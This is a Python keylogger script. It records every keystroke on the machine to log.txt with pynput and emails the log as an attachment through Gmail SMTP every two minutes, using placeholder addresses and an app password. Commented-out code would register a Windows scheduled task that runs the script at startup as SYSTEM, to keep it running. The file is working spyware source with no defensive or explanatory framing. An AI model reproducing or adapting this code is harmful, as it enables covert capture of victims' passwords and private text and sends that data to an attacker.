from pynput.keyboard import Key, Listener
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import os
# import sys
# import subprocess
def create_log_file():
    with open("log.txt", "w"):
        pass

#Check if log.txt file exists, if not, create it
if not os.path.exists("log.txt"):
    create_log_file()

keys = []

def keypress(key):
    global keys
    keys.append(key)
    print("{0} pressed".format(key))


def writefile(key):
    with open("log.txt", 'a') as f:
        try:
            char = key.char
            keystr = str(char)
            if keystr != 'None':
                f.write(keystr)
        except AttributeError:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.cmd or key == Key.backspace or key == Key.shift or key == Key.ctrl_l or key == Key.ctrl_r or key == Key.esc or key == Key.caps_lock or key == Key.alt_l or key == Key.alt_r or key == Key.alt_gr or key == Key.right or key == Key.left or key == Key.up or key == Key.down or key == Key.shift_r or key == Key.tab or key == Key.end or key == Key.page_down or key == Key.page_up:
                pass
            else:
                f.write(str(key))


def keyrelease(key):
    if key == Key.esc:
        return False

def send_email_thread():
    while True:
        send_email()
        time.sleep(120)


#Email Details
sender_email = "Put any email here"
receiver_email = "Put your email here and its App Password below"
subject = "Email with Attachment"
body = "Keystrokes in the attached log file."


attachment_file = "log.txt"


def send_email():
    #Create a multipart message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    with open(attachment_file, "rb") as attachment:
        
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

       
    encoders.encode_base64(part)

    
    part.add_header("Content-Disposition", f"attachment; filename= {attachment_file}")

    message.attach(part)

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls() 
        server.login(sender_email, "App Password Provided by Gmail Account(with spaces)") 
        server.sendmail(sender_email, receiver_email, message.as_string())

    print("Email with attachment sent successfully")
#def create_task(task_name, script_path):
    #command = f'schtasks /create /tn "{task_name}" /tr "{sys.executable} {script_path}" /sc onstart /ru System /f'
    #command = f'schtasks /create /tn "{task_name}" /tr "{sys.executable} {script_path}" /sc onstart /ru System /f'
    #subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)

#script_path = os.path.abspath(sys.argv[0])  
#task_name = "NewTask"

#create_task(task_name, script_path)

#different thread so that listener is not interrupted
email_thread = threading.Thread(target=send_email_thread)
email_thread.start()

    #Start the listener
with Listener(on_press=writefile, on_release=keyrelease) as listener:
    listener.join() 
        
